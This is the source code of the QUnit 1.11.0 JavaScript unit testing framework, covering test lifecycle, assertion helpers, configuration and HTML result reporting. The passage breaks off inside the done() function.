/**
 * QUnit v1.11.0 - A JavaScript Unit Testing Framework
 *
 * http://qunitjs.com
 *
 * Copyright 2012 jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */

(function( window ) {

var QUnit,
	assert,
	config,
	onErrorFnPrev,
	testId = 0,
	fileName = (sourceFromStacktrace( 0 ) || "" ).replace(/(:\d+)+\)?/, "").replace(/.+\//, ""),
	toString = Object.prototype.toString,
	hasOwn = Object.prototype.hasOwnProperty,
	// Keep a local reference to Date (GH-283)
	Date = window.Date,
	defined = {
		setTimeout: typeof window.setTimeout !== "undefined",
		sessionStorage: (function() {
			var x = "qunit-test-string";
			try {
				sessionStorage.setItem( x, x );
				sessionStorage.removeItem( x );
				return true;
			} catch( e ) {
				return false;
			}
		}())
	},
	/**
	 * Provides a normalized error string, correcting an issue
	 * with IE 7 (and prior) where Error.prototype.toString is
	 * not properly implemented
	 *
	 * Based on http://es5.github.com/#x15.11.4.4
	 *
	 * @param {String|Error} error
	 * @return {String} error message
	 */
	errorString = function( error ) {
		var name, message,
			errorString = error.toString();
		if ( errorString.substring( 0, 7 ) === "[object" ) {
			name = error.name ? error.name.toString() : "Error";
			message = error.message ? error.message.toString() : "";
			if ( name && message ) {
				return name + ": " + message;
			} else if ( name ) {
				return name;
			} else if ( message ) {
				return message;
			} else {
				return "Error";
			}
		} else {
			return errorString;
		}
	},
	/**
	 * Makes a clone of an object using only Array or Object as base,
	 * and copies over the own enumerable properties.
	 *
	 * @param {Object} obj
	 * @return {Object} New object with only the own properties (recursively).
	 */
	objectValues = function( obj ) {
		// Grunt 0.3.x uses an older version of jshint that still has jshint/jshint#392.
		/*jshint newcap: false */
		var key, val,
			vals = QUnit.is( "array", obj ) ? [] : {};
		for ( key in obj ) {
			if ( hasOwn.call( obj, key ) ) {
				val = obj[key];
				vals[key] = val === Object(val) ? objectValues(val) : val;
			}
		}
		return vals;
	};

function Test( settings ) {
	extend( this, settings );
	this.assertions = [];
	this.testNumber = ++Test.count;
}

Test.count = 0;

Test.prototype = {
	init: function() {
		var a, b, li,
			tests = id( "qunit-tests" );

		if ( tests ) {
			b = document.createElement( "strong" );
			b.innerHTML = this.nameHtml;

			// `a` initialized at top of scope
			a = document.createElement( "a" );
			a.innerHTML = "Rerun";
			a.href = QUnit.url({ testNumber: this.testNumber });

			li = document.createElement( "li" );
			li.appendChild( b );
			li.appendChild( a );
			li.className = "running";
			li.id = this.id = "qunit-test-output" + testId++;

			tests.appendChild( li );
		}
	},
	setup: function() {
		if ( this.module !== config.previousModule ) {
			if ( config.previousModule ) {
				runLoggingCallbacks( "moduleDone", QUnit, {
					name: config.previousModule,
					failed: config.moduleStats.bad,
					passed: config.moduleStats.all - config.moduleStats.bad,
					total: config.moduleStats.all
				});
			}
			config.previousModule = this.module;
			config.moduleStats = { all: 0, bad: 0 };
			runLoggingCallbacks( "moduleStart", QUnit, {
				name: this.module
			});
		} else if ( config.autorun ) {
			runLoggingCallbacks( "moduleStart", QUnit, {
				name: this.module
			});
		}

		config.current = this;

		this.testEnvironment = extend({
			setup: function() {},
			teardown: function() {}
		}, this.moduleTestEnvironment );

		this.started = +new Date();
		runLoggingCallbacks( "testStart", QUnit, {
			name: this.testName,
			module: this.module
		});

		// allow utility functions to access the current test environment
		// TODO why??
		QUnit.current_testEnvironment = this.testEnvironment;

		if ( !config.pollution ) {
			saveGlobal();
		}
		if ( config.notrycatch ) {
			this.testEnvironment.setup.call( this.testEnvironment );
			return;
		}
		try {
			this.testEnvironment.setup.call( this.testEnvironment );
		} catch( e ) {
			QUnit.pushFailure( "Setup failed on " + this.testName + ": " + ( e.message || e ), extractStacktrace( e, 1 ) );
		}
	},
	run: function() {
		config.current = this;

		var running = id( "qunit-testresult" );

		if ( running ) {
			running.innerHTML = "Running: <br/>" + this.nameHtml;
		}

		if ( this.async ) {
			QUnit.stop();
		}

		this.callbackStarted = +new Date();

		if ( config.notrycatch ) {
			this.callback.call( this.testEnvironment, QUnit.assert );
			this.callbackRuntime = +new Date() - this.callbackStarted;
			return;
		}

		try {
			this.callback.call( this.testEnvironment, QUnit.assert );
			this.callbackRuntime = +new Date() - this.callbackStarted;
		} catch( e ) {
			this.callbackRuntime = +new Date() - this.callbackStarted;

			QUnit.pushFailure( "Died on test #" + (this.assertions.length + 1) + " " + this.stack + ": " + ( e.message || e ), extractStacktrace( e, 0 ) );
			// else next test will carry the responsibility
			saveGlobal();

			// Restart the tests if they're blocking
			if ( config.blocking ) {
				QUnit.start();
			}
		}
	},
	teardown: function() {
		config.current = this;
		if ( config.notrycatch ) {
			if ( typeof this.callbackRuntime === "undefined" ) {
				this.callbackRuntime = +new Date() - this.callbackStarted;
			}
			this.testEnvironment.teardown.call( this.testEnvironment );
			return;
		} else {
			try {
				this.testEnvironment.teardown.call( this.testEnvironment );
			} catch( e ) {
				QUnit.pushFailure( "Teardown failed on " + this.testName + ": " + ( e.message || e ), extractStacktrace( e, 1 ) );
			}
		}
		checkPollution();
	},
	finish: function() {
		config.current = this;
		if ( config.requireExpects && this.expected === null ) {
			QUnit.pushFailure( "Expected number of assertions to be defined, but expect() was not called.", this.stack );
		} else if ( this.expected !== null && this.expected !== this.assertions.length ) {
			QUnit.pushFailure( "Expected " + this.expected + " assertions, but " + this.assertions.length + " were run", this.stack );
		} else if ( this.expected === null && !this.assertions.length ) {
			QUnit.pushFailure( "Expected at least one assertion, but none were run - call expect(0) to accept zero assertions.", this.stack );
		}

		var i, assertion, a, b, time, li, ol,
			test = this,
			good = 0,
			bad = 0,
			tests = id( "qunit-tests" );

		this.runtime = +new Date() - this.started;
		config.stats.all += this.assertions.length;
		config.moduleStats.all += this.assertions.length;

		if ( tests ) {
			ol = document.createElement( "ol" );
			ol.className = "qunit-assert-list";

			for ( i = 0; i < this.assertions.length; i++ ) {
				assertion = this.assertions[i];

				li = document.createElement( "li" );
				li.className = assertion.result ? "pass" : "fail";
				li.innerHTML = assertion.message || ( assertion.result ? "okay" : "failed" );
				ol.appendChild( li );

				if ( assertion.result ) {
					good++;
				} else {
					bad++;
					config.stats.bad++;
					config.moduleStats.bad++;
				}
			}

			// store result when possible
			if ( QUnit.config.reorder && defined.sessionStorage ) {
				if ( bad ) {
					sessionStorage.setItem( "qunit-test-" + this.module + "-" + this.testName, bad );
				} else {
					sessionStorage.removeItem( "qunit-test-" + this.module + "-" + this.testName );
				}
			}

			if ( bad === 0 ) {
				addClass( ol, "qunit-collapsed" );
			}

			// `b` initialized at top of scope
			b = document.createElement( "strong" );
			b.innerHTML = this.nameHtml + " <b class='counts'>(<b class='failed'>" + bad + "</b>, <b class='passed'>" + good + "</b>, " + this.assertions.length + ")</b>";

			addEvent(b, "click", function() {
				var next = b.parentNode.lastChild,
					collapsed = hasClass( next, "qunit-collapsed" );
				( collapsed ? removeClass : addClass )( next, "qunit-collapsed" );
			});

			addEvent(b, "dblclick", function( e ) {
				var target = e && e.target ? e.target : window.event.srcElement;
				if ( target.nodeName.toLowerCase() === "span" || target.nodeName.toLowerCase() === "b" ) {
					target = target.parentNode;
				}
				if ( window.location && target.nodeName.toLowerCase() === "strong" ) {
					window.location = QUnit.url({ testNumber: test.testNumber });
				}
			});

			// `time` initialized at top of scope
			time = document.createElement( "span" );
			time.className = "runtime";
			time.innerHTML = this.runtime + " ms";

			// `li` initialized at top of scope
			li = id( this.id );
			li.className = bad ? "fail" : "pass";
			li.removeChild( li.firstChild );
			a = li.firstChild;
			li.appendChild( b );
			li.appendChild( a );
			li.appendChild( time );
			li.appendChild( ol );

		} else {
			for ( i = 0; i < this.assertions.length; i++ ) {
				if ( !this.assertions[i].result ) {
					bad++;
					config.stats.bad++;
					config.moduleStats.bad++;
				}
			}
		}

		runLoggingCallbacks( "testDone", QUnit, {
			name: this.testName,
			module: this.module,
			failed: bad,
			passed: this.assertions.length - bad,
			total: this.assertions.length,
			duration: this.runtime
		});

		QUnit.reset();

		config.current = undefined;
	},

	queue: function() {
		var bad,
			test = this;

		synchronize(function() {
			test.init();
		});
		function run() {
			// each of these can by async
			synchronize(function() {
				test.setup();
			});
			synchronize(function() {
				test.run();
			});
			synchronize(function() {
				test.teardown();
			});
			synchronize(function() {
				test.finish();
			});
		}

		// `bad` initialized at top of scope
		// defer when previous test run passed, if storage is available
		bad = QUnit.config.reorder && defined.sessionStorage &&
						+sessionStorage.getItem( "qunit-test-" + this.module + "-" + this.testName );

		if ( bad ) {
			run();
		} else {
			synchronize( run, true );
		}
	}
};

// Root QUnit object.
// `QUnit` initialized at top of scope
QUnit = {

	// call on start of module test to prepend name to all tests
	module: function( name, testEnvironment ) {
		config.currentModule = name;
		config.currentModuleTestEnvironment = testEnvironment;
		config.modules[name] = true;
	},

	asyncTest: function( testName, expected, callback ) {
		if ( arguments.length === 2 ) {
			callback = expected;
			expected = null;
		}

		QUnit.test( testName, expected, callback, true );
	},

	test: function( testName, expected, callback, async ) {
		var test,
			nameHtml = "<span class='test-name'>" + escapeText( testName ) + "</span>";

		if ( arguments.length === 2 ) {
			callback = expected;
			expected = null;
		}

		if ( config.currentModule ) {
			nameHtml = "<span class='module-name'>" + escapeText( config.currentModule ) + "</span>: " + nameHtml;
		}

		test = new Test({
			nameHtml: nameHtml,
			testName: testName,
			expected: expected,
			async: async,
			callback: callback,
			module: config.currentModule,
			moduleTestEnvironment: config.currentModuleTestEnvironment,
			stack: sourceFromStacktrace( 2 )
		});

		if ( !validTest( test ) ) {
			return;
		}

		test.queue();
	},

	// Specify the number of expected assertions to gurantee that failed test (no assertions are run at all) don't slip through.
	expect: function( asserts ) {
		if (arguments.length === 1) {
			config.current.expected = asserts;
		} else {
			return config.current.expected;
		}
	},

	start: function( count ) {
		// QUnit hasn't been initialized yet.
		// Note: RequireJS (et al) may delay onLoad
		if ( config.semaphore === undefined ) {
			QUnit.begin(function() {
				// This is triggered at the top of QUnit.load, push start() to the event loop, to allow QUnit.load to finish first
				setTimeout(function() {
					QUnit.start( count );
				});
			});
			return;
		}

		config.semaphore -= count || 1;
		// don't start until equal number of stop-calls
		if ( config.semaphore > 0 ) {
			return;
		}
		// ignore if start is called more often then stop
		if ( config.semaphore < 0 ) {
			config.semaphore = 0;
			QUnit.pushFailure( "Called start() while already started (QUnit.config.semaphore was 0 already)", null, sourceFromStacktrace(2) );
			return;
		}
		// A slight delay, to avoid any current callbacks
		if ( defined.setTimeout ) {
			window.setTimeout(function() {
				if ( config.semaphore > 0 ) {
					return;
				}
				if ( config.timeout ) {
					clearTimeout( config.timeout );
				}

				config.blocking = false;
				process( true );
			}, 13);
		} else {
			config.blocking = false;
			process( true );
		}
	},

	stop: function( count ) {
		config.semaphore += count || 1;
		config.blocking = true;

		if ( config.testTimeout && defined.setTimeout ) {
			clearTimeout( config.timeout );
			config.timeout = window.setTimeout(function() {
				QUnit.ok( false, "Test timed out" );
				config.semaphore = 1;
				QUnit.start();
			}, config.testTimeout );
		}
	}
};

// `assert` initialized at top of scope
// Asssert helpers
// All of these must either call QUnit.push() or manually do:
// - runLoggingCallbacks( "log", .. );
// - config.current.assertions.push({ .. });
// We attach it to the QUnit object *after* we expose the public API,
// otherwise `assert` will become a global variable in browsers (#341).
assert = {
	/**
	 * Asserts rough true-ish result.
	 * @name ok
	 * @function
	 * @example ok( "asdfasdf".length > 5, "There must be at least 5 chars" );
	 */
	ok: function( result, msg ) {
		if ( !config.current ) {
			throw new Error( "ok() assertion outside test context, was " + sourceFromStacktrace(2) );
		}
		result = !!result;

		var source,
			details = {
				module: config.current.module,
				name: config.current.testName,
				result: result,
				message: msg
			};

		msg = escapeText( msg || (result ? "okay" : "failed" ) );
		msg = "<span class='test-message'>" + msg + "</span>";

		if ( !result ) {
			source = sourceFromStacktrace( 2 );
			if ( source ) {
				details.source = source;
				msg += "<table><tr class='test-source'><th>Source: </th><td><pre>" + escapeText( source ) + "</pre></td></tr></table>";
			}
		}
		runLoggingCallbacks( "log", QUnit, details );
		config.current.assertions.push({
			result: result,
			message: msg
		});
	},

	/**
	 * Assert that the first two arguments are equal, with an optional message.
	 * Prints out both actual and expected values.
	 * @name equal
	 * @function
	 * @example equal( format( "Received {0} bytes.", 2), "Received 2 bytes.", "format() replaces {0} with next argument" );
	 */
	equal: function( actual, expected, message ) {
		/*jshint eqeqeq:false */
		QUnit.push( expected == actual, actual, expected, message );
	},

	/**
	 * @name notEqual
	 * @function
	 */
	notEqual: function( actual, expected, message ) {
		/*jshint eqeqeq:false */
		QUnit.push( expected != actual, actual, expected, message );
	},

	/**
	 * @name propEqual
	 * @function
	 */
	propEqual: function( actual, expected, message ) {
		actual = objectValues(actual);
		expected = objectValues(expected);
		QUnit.push( QUnit.equiv(actual, expected), actual, expected, message );
	},

	/**
	 * @name notPropEqual
	 * @function
	 */
	notPropEqual: function( actual, expected, message ) {
		actual = objectValues(actual);
		expected = objectValues(expected);
		QUnit.push( !QUnit.equiv(actual, expected), actual, expected, message );
	},

	/**
	 * @name deepEqual
	 * @function
	 */
	deepEqual: function( actual, expected, message ) {
		QUnit.push( QUnit.equiv(actual, expected), actual, expected, message );
	},

	/**
	 * @name notDeepEqual
	 * @function
	 */
	notDeepEqual: function( actual, expected, message ) {
		QUnit.push( !QUnit.equiv(actual, expected), actual, expected, message );
	},

	/**
	 * @name strictEqual
	 * @function
	 */
	strictEqual: function( actual, expected, message ) {
		QUnit.push( expected === actual, actual, expected, message );
	},

	/**
	 * @name notStrictEqual
	 * @function
	 */
	notStrictEqual: function( actual, expected, message ) {
		QUnit.push( expected !== actual, actual, expected, message );
	},

	"throws": function( block, expected, message ) {
		var actual,
			expectedOutput = expected,
			ok = false;

		// 'expected' is optional
		if ( typeof expected === "string" ) {
			message = expected;
			expected = null;
		}

		config.current.ignoreGlobalErrors = true;
		try {
			block.call( config.current.testEnvironment );
		} catch (e) {
			actual = e;
		}
		config.current.ignoreGlobalErrors = false;

		if ( actual ) {
			// we don't want to validate thrown error
			if ( !expected ) {
				ok = true;
				expectedOutput = null;
			// expected is a regexp
			} else if ( QUnit.objectType( expected ) === "regexp" ) {
				ok = expected.test( errorString( actual ) );
			// expected is a constructor
			} else if ( actual instanceof expected ) {
				ok = true;
			// expected is a validation function which returns true is validation passed
			} else if ( expected.call( {}, actual ) === true ) {
				expectedOutput = null;
				ok = true;
			}

			QUnit.push( ok, actual, expectedOutput, message );
		} else {
			QUnit.pushFailure( message, null, 'No exception was thrown.' );
		}
	}
};

/**
 * @deprecate since 1.8.0
 * Kept assertion helpers in root for backwards compatibility.
 */
extend( QUnit, assert );

/**
 * @deprecated since 1.9.0
 * Kept root "raises()" for backwards compatibility.
 * (Note that we don't introduce assert.raises).
 */
QUnit.raises = assert[ "throws" ];

/**
 * @deprecated since 1.0.0, replaced with error pushes since 1.3.0
 * Kept to avoid TypeErrors for undefined methods.
 */
QUnit.equals = function() {
	QUnit.push( false, false, false, "QUnit.equals has been deprecated since 2009 (e88049a0), use QUnit.equal instead" );
};
QUnit.same = function() {
	QUnit.push( false, false, false, "QUnit.same has been deprecated since 2009 (e88049a0), use QUnit.deepEqual instead" );
};

// We want access to the constructor's prototype
(function() {
	function F() {}
	F.prototype = QUnit;
	QUnit = new F();
	// Make F QUnit's constructor so that we can add to the prototype later
	QUnit.constructor = F;
}());

/**
 * Config object: Maintain internal state
 * Later exposed as QUnit.config
 * `config` initialized at top of scope
 */
config = {
	// The queue of tests to run
	queue: [],

	// block until document ready
	blocking: true,

	// when enabled, show only failing tests
	// gets persisted through sessionStorage and can be changed in UI via checkbox
	hidepassed: false,

	// by default, run previously failed tests first
	// very useful in combination with "Hide passed tests" checked
	reorder: true,

	// by default, modify document.title when suite is done
	altertitle: true,

	// when enabled, all tests must call expect()
	requireExpects: false,

	// add checkboxes that are persisted in the query-string
	// when enabled, the id is set to `true` as a `QUnit.config` property
	urlConfig: [
		{
			id: "noglobals",
			label: "Check for Globals",
			tooltip: "Enabling this will test if any test introduces new properties on the `window` object. Stored as query-strings."
		},
		{
			id: "notrycatch",
			label: "No try-catch",
			tooltip: "Enabling this will run tests outside of a try-catch block. Makes debugging exceptions in IE reasonable. Stored as query-strings."
		}
	],

	// Set of all modules.
	modules: {},

	// logging callback queues
	begin: [],
	done: [],
	log: [],
	testStart: [],
	testDone: [],
	moduleStart: [],
	moduleDone: []
};

// Export global variables, unless an 'exports' object exists,
// in that case we assume we're in CommonJS (dealt with on the bottom of the script)
if ( typeof exports === "undefined" ) {
	extend( window, QUnit );

	// Expose QUnit object
	window.QUnit = QUnit;
}

// Initialize more QUnit.config and QUnit.urlParams
(function() {
	var i,
		location = window.location || { search: "", protocol: "file:" },
		params = location.search.slice( 1 ).split( "&" ),
		length = params.length,
		urlParams = {},
		current;

	if ( params[ 0 ] ) {
		for ( i = 0; i < length; i++ ) {
			current = params[ i ].split( "=" );
			current[ 0 ] = decodeURIComponent( current[ 0 ] );
			// allow just a key to turn on a flag, e.g., test.html?noglobals
			current[ 1 ] = current[ 1 ] ? decodeURIComponent( current[ 1 ] ) : true;
			urlParams[ current[ 0 ] ] = current[ 1 ];
		}
	}

	QUnit.urlParams = urlParams;

	// String search anywhere in moduleName+testName
	config.filter = urlParams.filter;

	// Exact match of the module name
	config.module = urlParams.module;

	config.testNumber = parseInt( urlParams.testNumber, 10 ) || null;

	// Figure out if we're running the tests from a server or not
	QUnit.isLocal = location.protocol === "file:";
}());

// Extend QUnit object,
// these after set here because they should not be exposed as global functions
extend( QUnit, {
	assert: assert,

	config: config,

	// Initialize the configuration options
	init: function() {
		extend( config, {
			stats: { all: 0, bad: 0 },
			moduleStats: { all: 0, bad: 0 },
			started: +new Date(),
			updateRate: 1000,
			blocking: false,
			autostart: true,
			autorun: false,
			filter: "",
			queue: [],
			semaphore: 1
		});

		var tests, banner, result,
			qunit = id( "qunit" );

		if ( qunit ) {
			qunit.innerHTML =
				"<h1 id='qunit-header'>" + escapeText( document.title ) + "</h1>" +
				"<h2 id='qunit-banner'></h2>" +
				"<div id='qunit-testrunner-toolbar'></div>" +
				"<h2 id='qunit-userAgent'></h2>" +
				"<ol id='qunit-tests'></ol>";
		}

		tests = id( "qunit-tests" );
		banner = id( "qunit-banner" );
		result = id( "qunit-testresult" );

		if ( tests ) {
			tests.innerHTML = "";
		}

		if ( banner ) {
			banner.className = "";
		}

		if ( result ) {
			result.parentNode.removeChild( result );
		}

		if ( tests ) {
			result = document.createElement( "p" );
			result.id = "qunit-testresult";
			result.className = "result";
			tests.parentNode.insertBefore( result, tests );
			result.innerHTML = "Running...<br/>&nbsp;";
		}
	},

	// Resets the test setup. Useful for tests that modify the DOM.
	reset: function() {
		var fixture = id( "qunit-fixture" );
		if ( fixture ) {
			fixture.innerHTML = config.fixture;
		}
	},

	// Trigger an event on an element.
	// @example triggerEvent( document.body, "click" );
	triggerEvent: function( elem, type, event ) {
		if ( document.createEvent ) {
			event = document.createEvent( "MouseEvents" );
			event.initMouseEvent(type, true, true, elem.ownerDocument.defaultView,
				0, 0, 0, 0, 0, false, false, false, false, 0, null);

			elem.dispatchEvent( event );
		} else if ( elem.fireEvent ) {
			elem.fireEvent( "on" + type );
		}
	},

	// Safe object type checking
	is: function( type, obj ) {
		return QUnit.objectType( obj ) === type;
	},

	objectType: function( obj ) {
		if ( typeof obj === "undefined" ) {
				return "undefined";
		// consider: typeof null === object
		}
		if ( obj === null ) {
				return "null";
		}

		var match = toString.call( obj ).match(/^\[object\s(.*)\]$/),
			type = match && match[1] || "";

		switch ( type ) {
			case "Number":
				if ( isNaN(obj) ) {
					return "nan";
				}
				return "number";
			case "String":
			case "Boolean":
			case "Array":
			case "Date":
			case "RegExp":
			case "Function":
				return type.toLowerCase();
		}
		if ( typeof obj === "object" ) {
			return "object";
		}
		return undefined;
	},

	push: function( result, actual, expected, message ) {
		if ( !config.current ) {
			throw new Error( "assertion outside test context, was " + sourceFromStacktrace() );
		}

		var output, source,
			details = {
				module: config.current.module,
				name: config.current.testName,
				result: result,
				message: message,
				actual: actual,
				expected: expected
			};

		message = escapeText( message ) || ( result ? "okay" : "failed" );
		message = "<span class='test-message'>" + message + "</span>";
		output = message;

		if ( !result ) {
			expected = escapeText( QUnit.jsDump.parse(expected) );
			actual = escapeText( QUnit.jsDump.parse(actual) );
			output += "<table><tr class='test-expected'><th>Expected: </th><td><pre>" + expected + "</pre></td></tr>";

			if ( actual !== expected ) {
				output += "<tr class='test-actual'><th>Result: </th><td><pre>" + actual + "</pre></td></tr>";
				output += "<tr class='test-diff'><th>Diff: </th><td><pre>" + QUnit.diff( expected, actual ) + "</pre></td></tr>";
			}

			source = sourceFromStacktrace();

			if ( source ) {
				details.source = source;
				output += "<tr class='test-source'><th>Source: </th><td><pre>" + escapeText( source ) + "</pre></td></tr>";
			}

			output += "</table>";
		}

		runLoggingCallbacks( "log", QUnit, details );

		config.current.assertions.push({
			result: !!result,
			message: output
		});
	},

	pushFailure: function( message, source, actual ) {
		if ( !config.current ) {
			throw new Error( "pushFailure() assertion outside test context, was " + sourceFromStacktrace(2) );
		}

		var output,
			details = {
				module: config.current.module,
				name: config.current.testName,
				result: false,
				message: message
			};

		message = escapeText( message ) || "error";
		message = "<span class='test-message'>" + message + "</span>";
		output = message;

		output += "<table>";

		if ( actual ) {
			output += "<tr class='test-actual'><th>Result: </th><td><pre>" + escapeText( actual ) + "</pre></td></tr>";
		}

		if ( source ) {
			details.source = source;
			output += "<tr class='test-source'><th>Source: </th><td><pre>" + escapeText( source ) + "</pre></td></tr>";
		}

		output += "</table>";

		runLoggingCallbacks( "log", QUnit, details );

		config.current.assertions.push({
			result: false,
			message: output
		});
	},

	url: function( params ) {
		params = extend( extend( {}, QUnit.urlParams ), params );
		var key,
			querystring = "?";

		for ( key in params ) {
			if ( !hasOwn.call( params, key ) ) {
				continue;
			}
			querystring += encodeURIComponent( key ) + "=" +
				encodeURIComponent( params[ key ] ) + "&";
		}
		return window.location.protocol + "//" + window.location.host +
			window.location.pathname + querystring.slice( 0, -1 );
	},

	extend: extend,
	id: id,
	addEvent: addEvent
	// load, equiv, jsDump, diff: Attached later
});

/**
 * @deprecated: Created for backwards compatibility with test runner that set the hook function
 * into QUnit.{hook}, instead of invoking it and passing the hook function.
 * QUnit.constructor is set to the empty F() above so that we can add to it's prototype here.
 * Doing this allows us to tell if the following methods have been overwritten on the actual
 * QUnit object.
 */
extend( QUnit.constructor.prototype, {

	// Logging callbacks; all receive a single argument with the listed properties
	// run test/logs.html for any related changes
	begin: registerLoggingCallback( "begin" ),

	// done: { failed, passed, total, runtime }
	done: registerLoggingCallback( "done" ),

	// log: { result, actual, expected, message }
	log: registerLoggingCallback( "log" ),

	// testStart: { name }
	testStart: registerLoggingCallback( "testStart" ),

	// testDone: { name, failed, passed, total, duration }
	testDone: registerLoggingCallback( "testDone" ),

	// moduleStart: { name }
	moduleStart: registerLoggingCallback( "moduleStart" ),

	// moduleDone: { name, failed, passed, total }
	moduleDone: registerLoggingCallback( "moduleDone" )
});

if ( typeof document === "undefined" || document.readyState === "complete" ) {
	config.autorun = true;
}

QUnit.load = function() {
	runLoggingCallbacks( "begin", QUnit, {} );

	// Initialize the config, saving the execution queue
	var banner, filter, i, label, len, main, ol, toolbar, userAgent, val,
		urlConfigCheckboxesContainer, urlConfigCheckboxes, moduleFilter,
		numModules = 0,
		moduleFilterHtml = "",
		urlConfigHtml = "",
		oldconfig = extend( {}, config );

	QUnit.init();
	extend(config, oldconfig);

	config.blocking = false;

	len = config.urlConfig.length;

	for ( i = 0; i < len; i++ ) {
		val = config.urlConfig[i];
		if ( typeof val === "string" ) {
			val = {
				id: val,
				label: val,
				tooltip: "[no tooltip available]"
			};
		}
		config[ val.id ] = QUnit.urlParams[ val.id ];
		urlConfigHtml += "<input id='qunit-urlconfig-" + escapeText( val.id ) +
			"' name='" + escapeText( val.id ) +
			"' type='checkbox'" + ( config[ val.id ] ? " checked='checked'" : "" ) +
			" title='" + escapeText( val.tooltip ) +
			"'><label for='qunit-urlconfig-" + escapeText( val.id ) +
			"' title='" + escapeText( val.tooltip ) + "'>" + val.label + "</label>";
	}

	moduleFilterHtml += "<label for='qunit-modulefilter'>Module: </label><select id='qunit-modulefilter' name='modulefilter'><option value='' " +
		( config.module === undefined  ? "selected='selected'" : "" ) +
		">< All Modules ></option>";

	for ( i in config.modules ) {
		if ( config.modules.hasOwnProperty( i ) ) {
			numModules += 1;
			moduleFilterHtml += "<option value='" + escapeText( encodeURIComponent(i) ) + "' " +
				( config.module === i ? "selected='selected'" : "" ) +
				">" + escapeText(i) + "</option>";
		}
	}
	moduleFilterHtml += "</select>";

	// `userAgent` initialized at top of scope
	userAgent = id( "qunit-userAgent" );
	if ( userAgent ) {
		userAgent.innerHTML = navigator.userAgent;
	}

	// `banner` initialized at top of scope
	banner = id( "qunit-header" );
	if ( banner ) {
		banner.innerHTML = "<a href='" + QUnit.url({ filter: undefined, module: undefined, testNumber: undefined }) + "'>" + banner.innerHTML + "</a> ";
	}

	// `toolbar` initialized at top of scope
	toolbar = id( "qunit-testrunner-toolbar" );
	if ( toolbar ) {
		// `filter` initialized at top of scope
		filter = document.createElement( "input" );
		filter.type = "checkbox";
		filter.id = "qunit-filter-pass";

		addEvent( filter, "click", function() {
			var tmp,
				ol = document.getElementById( "qunit-tests" );

			if ( filter.checked ) {
				ol.className = ol.className + " hidepass";
			} else {
				tmp = " " + ol.className.replace( /[\n\t\r]/g, " " ) + " ";
				ol.className = tmp.replace( / hidepass /, " " );
			}
			if ( defined.sessionStorage ) {
				if (filter.checked) {
					sessionStorage.setItem( "qunit-filter-passed-tests", "true" );
				} else {
					sessionStorage.removeItem( "qunit-filter-passed-tests" );
				}
			}
		});

		if ( config.hidepassed || defined.sessionStorage && sessionStorage.getItem( "qunit-filter-passed-tests" ) ) {
			filter.checked = true;
			// `ol` initialized at top of scope
			ol = document.getElementById( "qunit-tests" );
			ol.className = ol.className + " hidepass";
		}
		toolbar.appendChild( filter );

		// `label` initialized at top of scope
		label = document.createElement( "label" );
		label.setAttribute( "for", "qunit-filter-pass" );
		label.setAttribute( "title", "Only show tests and assertons that fail. Stored in sessionStorage." );
		label.innerHTML = "Hide passed tests";
		toolbar.appendChild( label );

		urlConfigCheckboxesContainer = document.createElement("span");
		urlConfigCheckboxesContainer.innerHTML = urlConfigHtml;
		urlConfigCheckboxes = urlConfigCheckboxesContainer.getElementsByTagName("input");
		// For oldIE support:
		// * Add handlers to the individual elements instead of the container
		// * Use "click" instead of "change"
		// * Fallback from event.target to event.srcElement
		addEvents( urlConfigCheckboxes, "click", function( event ) {
			var params = {},
				target = event.target || event.srcElement;
			params[ target.name ] = target.checked ? true : undefined;
			window.location = QUnit.url( params );
		});
		toolbar.appendChild( urlConfigCheckboxesContainer );

		if (numModules > 1) {
			moduleFilter = document.createElement( 'span' );
			moduleFilter.setAttribute( 'id', 'qunit-modulefilter-container' );
			moduleFilter.innerHTML = moduleFilterHtml;
			addEvent( moduleFilter.lastChild, "change", function() {
				var selectBox = moduleFilter.getElementsByTagName("select")[0],
					selectedModule = decodeURIComponent(selectBox.options[selectBox.selectedIndex].value);

				window.location = QUnit.url( { module: ( selectedModule === "" ) ? undefined : selectedModule } );
			});
			toolbar.appendChild(moduleFilter);
		}
	}

	// `main` initialized at top of scope
	main = id( "qunit-fixture" );
	if ( main ) {
		config.fixture = main.innerHTML;
	}

	if ( config.autostart ) {
		QUnit.start();
	}
};

addEvent( window, "load", QUnit.load );

// `onErrorFnPrev` initialized at top of scope
// Preserve other handlers
onErrorFnPrev = window.onerror;

// Cover uncaught exceptions
// Returning true will surpress the default browser handler,
// returning false will let it run.
window.onerror = function ( error, filePath, linerNr ) {
	var ret = false;
	if ( onErrorFnPrev ) {
		ret = onErrorFnPrev( error, filePath, linerNr );
	}

	// Treat return value as window.onerror itself does,
	// Only do our handling if not surpressed.
	if ( ret !== true ) {
		if ( QUnit.config.current ) {
			if ( QUnit.config.current.ignoreGlobalErrors ) {
				return true;
			}
			QUnit.pushFailure( error, filePath + ":" + linerNr );
		} else {
			QUnit.test( "global failure", extend( function() {
				QUnit.pushFailure( error, filePath + ":" + linerNr );
			}, { validTest: validTest } ) );
		}
		return false;
	}

	return ret;
};

function done() {
	config.autorun = true;

	// Log the last module results
	if ( config.currentModule ) {
		runLoggingCallbacks( "moduleDone", QUnit, {
			name: config.currentModule,
			failed: config.moduleStats.bad,
			passed: config.moduleStats.all - config.moduleStats.bad,
			total: config.moduleStats.all
		});
	}

	var i, key,
		banner = id( "qunit-banner" ),
		tests = id( "qunit-tests" ),
		runtime = +new Date() - config.started,
		passed = config.stats.all - config.stats.bad,
		html = [
			"Tests completed in ",
			runtime,
			" milliseconds.<br/>",
			"<span class='passed'>",
			passed,
			"</span> assertions of <span class='total'>",
			config.stats.all,
			"</span> passed, <span class='failed'>",
			config.stats.bad,
			"</span> failed."
		].join( "" );

	if ( banner ) {
		banner.className = ( config.stats.bad ? "qunit-fail" : "qunit-pass" );
	}

	if ( tests ) {
		id( "qunit-testresult" ).innerHTML = html;
	}

	if ( config.altertitle && typeof document !== "undefined" && document.title ) {
		// show ✖ for good, ✔ for bad suite result in title
		// use escape sequences in case file gets loaded with non-utf-8-charset
		document.title = [
			( config.stats.bad ? "\u2716" : "\u2714" ),
			document.title.replace( /^[\u2714\u2716] /i, "" )
		].join( " " );
	}

	// clear own sessionStorage items if all tests passed
	if ( config.reorder && defined.sessionStorage && config.stats.bad === 0 ) {
		// `key` & `i` initialized at top of scope
		for ( i = 0; i < sessionStorage.length; i++ ) {
			key = sessionStorage.key( i++ );
			if ( key.indexOf( "qunit-test-" ) === 0 ) {
				sessionStorage.removeItem( key );
			}
		}
	}

	// scroll back to top to show results
	if ( window.scrollTo ) {
